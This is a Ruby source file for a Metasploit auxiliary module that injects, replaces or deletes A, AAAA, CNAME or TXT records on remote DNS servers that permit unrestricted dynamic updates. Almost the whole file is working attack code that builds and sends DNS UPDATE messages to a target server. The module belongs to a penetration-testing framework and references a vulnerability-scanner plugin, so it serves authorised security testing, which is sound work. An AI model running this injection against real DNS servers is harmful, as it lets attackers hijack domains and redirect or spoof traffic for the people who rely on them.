# -*- coding: binary -*-
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'dnsruby'

class MetasploitModule < Msf::Auxiliary

  def initialize
    super(
        'Name'           => 'DNS Server Dynamic Update Record Injection',
        'Description'    => %q{
        This module allows adding and/or deleting a record to
        any remote DNS server that allows unrestricted dynamic updates.},
        'Author'         => [ 'King Sabri <king.sabri[at]gmail.com>' ],
        'References'     => [
          ['URL', 'http://www.tenable.com/plugins/index.php?view=single&id=35372'],
          ['URL', 'https://github.com/KINGSABRI/CVE-in-Ruby/tree/master/NONE-CVE/DNSInject'],
          ['URL', 'https://www.christophertruncer.com/dns-modification-dnsinject-nessus-plugin-35372/'],
          ['URL', 'https://github.com/ChrisTruncer/PenTestScripts/blob/master/DNSInject.py']
        ],
        'License'        => MSF_LICENSE,
        'Actions'        => [
          ['UPDATE',  {'Description' => 'Add or update a record. (default)'}],
          ['ADD',     {'Description' => 'Add a new record. Fail if it already exists.'}],
          ['DELETE',  {'Description' => 'Delete an existing record.'}]
        ],
        'DefaultAction' => 'UPDATE'
    )

    register_options([
      OptString.new('DOMAIN', [true, 'The domain name']),
      OptAddress.new('RHOST', [true, 'The vulnerable DNS server IP address']),
      OptString.new('HOSTNAME', [true, 'The name record you want to inject']),
      OptAddress.new('IP', [false, 'The IP you want to assign to the injected record']),
      OptString.new('VALUE', [false, 'The string to be injected with TXT or CNAME record']),
      OptEnum.new('TYPE',  [true, 'The record type you want to inject.', 'A', ['A', 'AAAA', 'CNAME', 'TXT']])
    ])

    deregister_options('RPORT')
  end

  def record_action(type, type_enum, value, action)
    # Send the update to the zone's primary master.
    domain = datastore['DOMAIN']
    fqdn   = "#{datastore['HOSTNAME']}.#{domain}"
    resolver = Dnsruby::Resolver.new({:nameserver => datastore['RHOST']})
    update   = Dnsruby::Update.new(domain)
    updated  = false
    case
      when action == :add
        update.absent("#{fqdn}.", type)
        update.add("#{fqdn}.", type_enum, 86400, value)
        begin
          resolver.send_message(update)
          print_good "The record '#{fqdn} => #{value}' has been added!"
          updated = true
        rescue Dnsruby::YXRRSet, Dnsruby::NXRRSet, Dnsruby::NXDomain => e
          print_error "Cannot inject #{fqdn}. The DNS server may not be vulnerable or the hostname may exist as a static record."
          vprint_error "Update failed: #{e.message}"
        end
      when action == :delete
        begin
          update.present(fqdn, type)
          update.delete(fqdn, type)
          resolver.send_message(update)
          print_good("The record '#{fqdn} => #{value}' has been deleted!")
          updated = false
        rescue Dnsruby::YXRRSet, Dnsruby::NXRRSet => e
          print_error "Cannot delete #{fqdn}. DNS server is vulnerable or domain doesn't exist."
          vprint_error "Update failed: #{e.message}"
        end
    end
    updated
  end

  def update_record(type:, type_enum:, value:, value_name:)
    if value.nil? || value == ""
      print_error "Record type #{type} requires the #{value_name} parameter to be specified"
      return
    end
    case
      when action.name == 'UPDATE'
        if record_action(type, type_enum, value, :add) == false
          print_good "Attempting to force an update to an existing record."
          if record_action(type, type_enum, value, :delete) == true
            record_action(type, type_enum, value, :add)
          end
        end
      when action.name == 'ADD'
        record_action(type, type_enum, value, :add)
      when action.name == 'DELETE'
        record_action(type, type_enum, value, :delete)
    end
  end

  def run
    ip = datastore['IP']
    value = datastore['VALUE']
    begin
      print_status("Sending DNS query payload...")
      case
      when datastore['TYPE'] == 'A'
        update_record(type: 'A', type_enum: Dnsruby::Types.A, value: ip, value_name: 'IP')
      when datastore['TYPE'] == 'AAAA'
        update_record(type: 'AAAA', type_enum: Dnsruby::Types.AAAA, value: ip, value_name: 'IP')
      when datastore['TYPE'] == 'CNAME'
        update_record(type: 'CNAME', type_enum: Dnsruby::Types.CNAME, value: value, value_name: 'VALUE')
      when datastore['TYPE'] == 'TXT'
        update_record(type: 'TXT', type_enum: Dnsruby::Types.TXT, value: value, value_name: 'VALUE')
      else
        print_error "Invalid Record Type!"
      end
    rescue ArgumentError => e
      print_error(e.message)
    rescue Dnsruby::OtherResolvError
      print_error("Connection Refused!")
    rescue Dnsruby::DecodeError
      print_error("Invalid DNS reply, ensure you are connecting to a DNS server")
    end
  end
end
